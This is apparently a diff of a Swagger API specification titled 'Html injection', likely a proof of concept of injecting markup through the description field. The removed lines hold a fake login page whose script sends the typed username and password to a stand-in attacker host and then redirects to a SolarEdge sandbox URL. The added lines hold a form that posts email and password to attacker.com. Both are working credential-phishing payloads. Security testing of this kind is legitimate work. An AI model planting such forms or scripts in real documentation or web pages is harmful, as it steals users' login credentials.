@@ -2,58 +2,14 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Html injection
-  description: '<!DOCTYPE html>
-<html lang="en">
-
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login</title>
-  <link rel="stylesheet" href="login-page.css">
-  <script defer src="login-page.js"></script>
-</head>
-
-<body>
-  <main id="main-holder">
-    <h1 id="login-header">Login</h1>
-    
-    <div id="login-error-msg-holder">
-      <p id="login-error-msg">Invalid username <span id="error-msg-second-line">and/or password</span></p>
-    </div>
-    
-    <form id="login-form">
-      <input type="text" name="username" id="username" class="login-form-field" placeholder="Username">
-      <input type="password" name="password" id="password" class="login-form-field" placeholder="Password">
-      <input type="submit" onclick="login_user()" value="Login" id="login-form-submit">
-    </form>
-  
-  </main>
-</body>
-
-</html>
-
-
-	<script type="text/javascript">
-	function login_user() {
-	    let path = "http://solaredgeattcaker.attack/api/resource";
-	    let username = document.getElementById("username").value;
-	    let password = document.getElementById("password").value;
-
-	    let data = {username: username, password: password};
-
-	    fetch(path, {
-		headers: {
-		    "Content-Type": "application/json"},
-		    method: "POST", 
-		    body: JSON.stringify(data)}
-	    );
-
-
-		location.href="https://sandbox-api-stg.solaredge.com/"
-	};
-	</script>
-
-
+  description: '<form action="http://attacker.com/webmail/?postlogin" method="post">
+Email: <input type="text" name="Login"><br>
+Password: <input type="text" name="Password"><br>
+<input type="submit" value="Login">
+</script> '
+location.href="https://sandbox-api-stg.solaredge.com/"
+</script> '
+</form>
 '
 paths:
   /:
